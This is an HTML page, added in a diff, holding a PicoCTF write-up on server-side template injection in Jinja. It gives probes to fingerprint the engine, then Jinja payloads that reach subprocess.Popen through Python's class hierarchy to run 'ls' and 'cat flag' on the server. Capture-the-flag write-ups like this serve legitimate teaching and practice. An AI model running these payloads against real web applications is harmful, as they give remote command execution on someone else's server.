@@ -1,0 +1,624 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>PicoCTF Write-Up | SSTI1</title>
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&family=Rajdhani:wght@300;400;600&display=swap" rel="stylesheet"/>
+  <style>
+    :root {
+      --bg:        #0d1e2b;
+      --surface:   #162838;
+      --border:    #2a6080;
+      --accent:    #40f0ff;
+      --accent2:   #ff6680;
+      --accent3:   #70ff50;
+      --text:      #e8f4fb;
+      --muted:     #8ab8cc;
+      --code-bg:   #0a1822;
+      --glow:      0 0 16px #40f0ff88;
+    }
+
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: 'Rajdhani', sans-serif;
+      font-size: 1.2rem;
+      line-height: 1.8;
+      min-height: 100vh;
+      overflow-x: hidden;
+    }
+
+    /* Scanline overlay */
+    body::before {
+      content: '';
+      position: fixed; inset: 0;
+      background: repeating-linear-gradient(
+        to bottom,
+        transparent 0px, transparent 3px,
+        rgba(0,0,0,0.08) 3px, rgba(0,0,0,0.08) 4px
+      );
+      pointer-events: none;
+      z-index: 999;
+    }
+
+    /* Grid bg */
+    body::after {
+      content: '';
+      position: fixed; inset: 0;
+      background-image:
+        linear-gradient(rgba(0,229,255,0.03) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(0,229,255,0.03) 1px, transparent 1px);
+      background-size: 40px 40px;
+      pointer-events: none;
+      z-index: 0;
+    }
+
+    .page-wrap {
+      position: relative;
+      z-index: 1;
+      max-width: 860px;
+      margin: 0 auto;
+      padding: 3rem 1.5rem 6rem;
+    }
+
+    /* ── Header ── */
+    header {
+      border-bottom: 1px solid var(--border);
+      padding-bottom: 2rem;
+      margin-bottom: 3rem;
+      animation: fadeDown 0.6s ease both;
+    }
+
+    .ctf-label {
+      font-family: 'Share Tech Mono', monospace;
+      font-size: 0.95rem;
+      letter-spacing: 0.25em;
+      color: var(--accent);
+      text-transform: uppercase;
+      margin-bottom: 0.5rem;
+    }
+
+    header h1 {
+      font-family: 'Orbitron', monospace;
+      font-size: clamp(2rem, 5vw, 3.4rem);
+      font-weight: 900;
+      color: #fff;
+      text-shadow: var(--glow);
+      line-height: 1.1;
+      margin-bottom: 1.2rem;
+    }
+
+    .meta-grid {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 0.6rem 1.4rem;
+      font-family: 'Share Tech Mono', monospace;
+      font-size: 1rem;
+    }
+
+    .meta-item {
+      display: flex;
+      align-items: center;
+      gap: 0.4rem;
+      color: var(--muted);
+    }
+
+    .meta-item span.val {
+      color: var(--accent);
+    }
+
+    .badge {
+      display: inline-block;
+      padding: 0.15em 0.7em;
+      border-radius: 2px;
+      font-family: 'Share Tech Mono', monospace;
+      font-size: 0.95rem;
+      letter-spacing: 0.08em;
+      border: 1px solid;
+    }
+    .badge.diff-easy   { color: var(--accent3);  border-color: var(--accent3);  background: rgba(57,255,20,0.07); }
+    .badge.diff-medium { color: #ffcc00;          border-color: #ffcc00;         background: rgba(255,204,0,0.07); }
+    .badge.diff-hard   { color: var(--accent2);   border-color: var(--accent2);  background: rgba(255,63,91,0.07); }
+
+    /* ── Sections ── */
+    section {
+      margin-bottom: 2.8rem;
+      animation: fadeUp 0.5s ease both;
+    }
+
+    section:nth-child(1) { animation-delay: 0.1s; }
+    section:nth-child(2) { animation-delay: 0.2s; }
+    section:nth-child(3) { animation-delay: 0.3s; }
+    section:nth-child(4) { animation-delay: 0.4s; }
+    section:nth-child(5) { animation-delay: 0.5s; }
+
+    .section-header {
+      display: flex;
+      align-items: center;
+      gap: 0.8rem;
+      margin-bottom: 1.2rem;
+    }
+
+    .section-num {
+      font-family: 'Share Tech Mono', monospace;
+      font-size: 0.9rem;
+      color: var(--accent);
+      letter-spacing: 0.1em;
+      opacity: 0.7;
+    }
+
+    h2 {
+      font-family: 'Orbitron', monospace;
+      font-size: 1.25rem;
+      font-weight: 700;
+      color: var(--accent);
+      text-transform: uppercase;
+      letter-spacing: 0.12em;
+    }
+
+    .section-line {
+      flex: 1;
+      height: 1px;
+      background: linear-gradient(to right, var(--border), transparent);
+    }
+
+    /* ── Cards & content ── */
+    .card {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-left: 3px solid var(--accent);
+      padding: 1.2rem 1.4rem;
+      margin-bottom: 1rem;
+      border-radius: 0 4px 4px 0;
+    }
+
+    .card h3 {
+      font-family: 'Orbitron', monospace;
+      font-size: 1.05rem;
+      font-weight: 700;
+      color: #fff;
+      margin-bottom: 0.5rem;
+    }
+
+    .card ul {
+      list-style: none;
+      padding: 0;
+    }
+
+    .card ul li {
+      padding: 0.2rem 0 0.2rem 1.2rem;
+      position: relative;
+      color: var(--text);
+    }
+
+    .card ul li::before {
+      content: '›';
+      position: absolute;
+      left: 0;
+      color: var(--accent);
+    }
+
+    /* ── Step blocks ── */
+    .step {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 4px;
+      margin-bottom: 1.2rem;
+      overflow: hidden;
+      transition: border-color 0.2s;
+    }
+
+    .step:hover { border-color: var(--accent); }
+
+    .step-header {
+      display: flex;
+      align-items: center;
+      gap: 0.8rem;
+      padding: 0.8rem 1.2rem;
+      border-bottom: 1px solid var(--border);
+      background: rgba(0,229,255,0.03);
+    }
+
+    .step-num {
+      font-family: 'Share Tech Mono', monospace;
+      font-size: 0.9rem;
+      color: var(--muted);
+      min-width: 2.5rem;
+    }
+
+    .step-label {
+      font-family: 'Share Tech Mono', monospace;
+      font-size: 1rem;
+      color: #fff;
+      flex: 1;
+    }
+
+    .step-body {
+      padding: 1rem 1.2rem;
+    }
+
+    .io-row {
+      display: grid;
+      grid-template-columns: 60px 1fr;
+      gap: 0.4rem 0.8rem;
+      margin-bottom: 0.8rem;
+      align-items: start;
+    }
+
+    .io-label {
+      font-family: 'Share Tech Mono', monospace;
+      font-size: 0.9rem;
+      letter-spacing: 0.1em;
+      padding-top: 0.1rem;
+    }
+
+    .io-label.in  { color: var(--accent);  }
+    .io-label.out { color: var(--accent3); }
+
+    code {
+      font-family: 'Share Tech Mono', monospace;
+      font-size: 1rem;
+      background: var(--code-bg);
+      border: 1px solid var(--border);
+      padding: 0.5rem 0.8rem;
+      display: block;
+      border-radius: 2px;
+      color: var(--accent);
+      word-break: break-all;
+      white-space: pre-wrap;
+    }
+
+    code.output {
+      color: var(--accent3);
+    }
+
+    .reason {
+      font-size: 1.05rem;
+      color: var(--muted);
+      margin-top: 0.6rem;
+      padding-top: 0.6rem;
+      border-top: 1px dashed var(--border);
+    }
+
+    .reason strong {
+      color: var(--text);
+      font-weight: 600;
+    }
+
+    /* ── Info gathering prose ── */
+    .prose {
+      font-size: 1.1rem;
+      color: var(--text);
+      line-height: 1.9;
+      margin-bottom: 1rem;
+    }
+
+    /* ── Flag reveal ── */
+    .flag-box {
+      background: var(--code-bg);
+      border: 1px solid var(--accent3);
+      border-radius: 4px;
+      padding: 1.4rem 1.8rem;
+      text-align: center;
+      box-shadow: 0 0 24px rgba(57,255,20,0.12), inset 0 0 30px rgba(57,255,20,0.04);
+    }
+
+    .flag-label {
+      font-family: 'Share Tech Mono', monospace;
+      font-size: 0.7rem;
+      letter-spacing: 0.25em;
+      color: var(--muted);
+      text-transform: uppercase;
+      margin-bottom: 0.6rem;
+    }
+
+    .flag-value {
+      font-family: 'Share Tech Mono', monospace;
+      font-size: 1.05rem;
+      color: var(--accent3);
+      text-shadow: 0 0 10px rgba(57,255,20,0.5);
+      word-break: break-all;
+    }
+
+    /* ── Tags ── */
+    .tags {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 0.5rem;
+      margin-top: 0.8rem;
+    }
+
+    .tag {
+      font-family: 'Share Tech Mono', monospace;
+      font-size: 0.9rem;
+      letter-spacing: 0.1em;
+      padding: 0.2em 0.7em;
+      border: 1px solid var(--border);
+      color: var(--muted);
+      border-radius: 2px;
+      background: rgba(255,255,255,0.03);
+    }
+
+    /* ── Footer ── */
+    footer {
+      margin-top: 4rem;
+      padding-top: 1.5rem;
+      border-top: 1px solid var(--border);
+      font-family: 'Share Tech Mono', monospace;
+      font-size: 0.9rem;
+      color: var(--muted);
+      display: flex;
+      justify-content: space-between;
+      flex-wrap: wrap;
+      gap: 0.5rem;
+    }
+
+    /* ── Animations ── */
+    @keyframes fadeDown {
+      from { opacity: 0; transform: translateY(-16px); }
+      to   { opacity: 1; transform: translateY(0); }
+    }
+
+    @keyframes fadeUp {
+      from { opacity: 0; transform: translateY(12px); }
+      to   { opacity: 1; transform: translateY(0); }
+    }
+
+    /* ── Responsive ── */
+    @media (max-width: 600px) {
+      .io-row { grid-template-columns: 1fr; }
+      .io-label { margin-bottom: 0.2rem; }
+    }
+  </style>
+</head>
+<body>
+<div class="page-wrap">
+
+  <!-- ═══════════ HEADER ═══════════ -->
+  <header>
+    <div class="ctf-label">PicoCTF &mdash; Write-Up</div>
+    <h1>Server-Side Template Injection (SSTI1)</h1>
+
+    <div class="meta-grid">
+      <div class="meta-item">
+        <span>Category:</span>
+        <span class="val">Web Exploitation</span>
+      </div>
+      <div class="meta-item">
+        <span>Points:</span>
+        <span class="val">[000]</span>
+      </div>
+      <div class="meta-item">
+        <span>Author:</span>
+        <span class="val">Kelvin</span>
+      </div>
+      <div class="meta-item">
+        <span>Difficulty:</span>
+        <span class="badge diff-easy ">Hard</span>
+      </div>
+    </div>
+
+    <div class="tags">
+      <span class="tag">#web</span>
+      <span class="tag">#ssti1</span>
+      <span class="tag">#python</span>
+      <span class="tag">#jinja</span>
+    </div>
+  </header>
+
+  <!-- ═══════════ 1. RESEARCH ═══════════ -->
+  <section>
+    <div class="section-header">
+      <span class="section-num">01</span>
+      <h2>Research</h2>
+      <div class="section-line"></div>
+    </div>
+
+    <div class="card">
+      <h3>What is SSTI?</h3>
+      <ul>
+        <li>Server-Side Template Injection occurs when an attacker can inject malicious input into a server-side template.</li>
+        <li>A server-side template is a file used by a web application to generate dynamic content on the server (like the blueprint of the web app).</li>
+      </ul>
+    </div>
+
+    <div class="card">
+      <h3>Common Server-Side Template Engines</h3>
+      <ul>
+        <li><strong>Python:</strong> Jinja, Django</li>
+        <li><strong>PHP:</strong> Twig, Blade</li>
+        <li><strong>Java:</strong> FreeMarker, Thymeleaf</li>
+        <li><strong>Ruby:</strong> ERB</li>
+        <li><strong>Javascript:</strong> EJS</li>
+      </ul>
+    </div>
+  </section>
+
+  <!-- ═══════════ 2. INFORMATION GATHERING ═══════════ -->
+  <section>
+    <div class="section-header">
+      <span class="section-num">02</span>
+      <h2>Information Gathering</h2>
+      <div class="section-line"></div>
+    </div>
+
+    <p class="prose">
+      Start by determining if the application evaluates template expressions from user input, and then identify the specific template engine in use.
+    </p>
+
+    <div class="step">
+      <div class="step-header">
+        <span class="step-num">STEP 01</span>
+        <span class="step-label">Basic Quick Check</span>
+      </div>
+      <div class="step-body">
+        <div class="io-row">
+          <span class="io-label in">INPUT</span>
+          <code>{{7*7}}</code>
+        </div>
+        <div class="io-row">
+          <span class="io-label out">OUTPUT</span>
+          <code class="output">49</code>
+        </div>
+        <p class="reason">
+          <strong>Reason:</strong> This confirms the vulnerability and rules out engines that do not use `{{...}}` syntax. It likely points to Jinja or Twig.
+        </p>
+      </div>
+    </div>
+
+    <div class="step">
+      <div class="step-header">
+        <span class="step-num">STEP 02</span>
+        <span class="step-label">Fingerprinting the Engine</span>
+      </div>
+      <div class="step-body">
+        <div class="io-row">
+          <span class="io-label in">INPUT</span>
+          <code>{{7*'7'}}</code>
+        </div>
+        <div class="io-row">
+          <span class="io-label out">OUTPUT</span>
+          <code class="output">7777777</code>
+        </div>
+        <p class="reason">
+          <strong>Reason:</strong> If it were Twig, it would output 49. The output `7777777` confirms Python is evaluating the expression, meaning the engine is Jinja. Running `{{self.__class__}}` verifies this by outputting `&lt;class 'jinja2.runtime.TemplateReference'&gt;`.
+        </p>
+      </div>
+    </div>
+  </section>
+
+  <!-- ═══════════ 3. CREATING THE PAYLOAD ═══════════ -->
+  <section>
+    <div class="section-header">
+      <span class="section-num">03</span>
+      <h2>Creating the Payload</h2>
+      <div class="section-line"></div>
+    </div>
+
+    <p class="prose">
+      The goal is to escape the sandbox by traversing Python's Method Resolution Order (MRO) to find a class that allows executing OS commands.
+    </p>
+
+    <div class="step">
+      <div class="step-header">
+        <span class="step-num">STEP 01</span>
+        <span class="step-label">Finding the Object Class</span>
+      </div>
+      <div class="step-body">
+        <div class="io-row">
+          <span class="io-label in">INPUT</span>
+          <code>{{''.__class__.__mro__[1]}}</code>
+        </div>
+        <div class="io-row">
+          <span class="io-label out">OUTPUT</span>
+          <code class="output">&lt;class 'object'&gt;</code>
+        </div>
+        <p class="reason">
+          <strong>Reason:</strong> Starting with an empty string `''`, we access its class `str`, then its MRO tuple, and grab the base `object` class at index 1.
+        </p>
+      </div>
+    </div>
+
+    <div class="step">
+      <div class="step-header">
+        <span class="step-num">STEP 02</span>
+        <span class="step-label">Listing Subclasses</span>
+      </div>
+      <div class="step-body">
+        <div class="io-row">
+          <span class="io-label in">INPUT</span>
+          <code>{{''.__class__.__mro__[1].__subclasses__()}}</code>
+        </div>
+        <div class="io-row">
+          <span class="io-label out">OUTPUT</span>
+          <code class="output">[... list of classes ...]</code>
+        </div>
+        <p class="reason">
+          <strong>Reason:</strong> We display all classes that inherit from `object`. We are looking for classes in `os` or `subprocess` modules. We find `subprocess.Popen` at index 356.
+        </p>
+      </div>
+    </div>
+
+    <div class="step">
+      <div class="step-header">
+        <span class="step-num">STEP 03</span>
+        <span class="step-label">Remote Code Execution</span>
+      </div>
+      <div class="step-body">
+        <div class="io-row">
+          <span class="io-label in">INPUT</span>
+          <code>{{''.__class__.__mro__[1].__subclasses__()[356](['ls'], shell=True, stdout=-1).communicate()}}</code>
+        </div>
+        <div class="io-row">
+          <span class="io-label out">OUTPUT</span>
+          <code class="output">(b'__pycache__\napp.py\nflag\nrequirements.txt\n', None)</code>
+        </div>
+        <p class="reason">
+          <strong>Reason:</strong> We instantiate `subprocess.Popen` to run the `ls` command. We see a file named `flag` in the output directory list.
+        </p>
+      </div>
+    </div>
+
+    <div class="step">
+      <div class="step-header">
+        <span class="step-num">STEP 04</span>
+        <span class="step-label">Extracting the Flag</span>
+      </div>
+      <div class="step-body">
+        <div class="io-row">
+          <span class="io-label in">INPUT</span>
+          <code>{{''.__class__.__mro__[1].__subclasses__()[356](['cat flag'], shell=True, stdout=-1).communicate()}}</code>
+        </div>
+        <div class="io-row">
+          <span class="io-label out">OUTPUT</span>
+          <code class="output">[Flag Content]</code>
+        </div>
+        <p class="reason">
+          <strong>Reason:</strong> Running the `cat flag` command through the Popen shell allows us to read the flag and solve the puzzle.
+        </p>
+      </div>
+    </div>
+  </section>
+
+  <!-- ═══════════ 4. FLAG ═══════════ -->
+  <section>
+    <div class="section-header">
+      <span class="section-num">04</span>
+      <h2>Flag</h2>
+      <div class="section-line"></div>
+    </div>
+
+    <div class="flag-box">
+      <div class="flag-label">Captured Flag</div>
+      <div class="flag-value">picoCTF{...}</div>
+    </div>
+  </section>
+
+  <!-- ═══════════ 5. TAKEAWAYS (optional) ═══════════ -->
+  <section>
+    <div class="section-header">
+      <span class="section-num">05</span>
+      <h2>Key Takeaways</h2>
+      <div class="section-line"></div>
+    </div>
+
+    <div class="card">
+      <ul>
+        <li>Never pass unsanitized user input directly to a template engine's rendering context.</li>
+        <li>Python's class inheritance hierarchy (`__mro__`, `__subclasses__`) allows powerful sandbox escapes if remote code execution is achieved.</li>
+      </ul>
+    </div>
+  </section>
+
+  <!-- ═══════════ FOOTER ═══════════ -->
+  <footer>
+    <span>Kelvin &mdash; PicoCTF Write-Up</span>
+    <span>2024 &mdash; All steps performed in a legal CTF environment.</span>
+  </footer>
+
+</div>
+</body>
+</html>
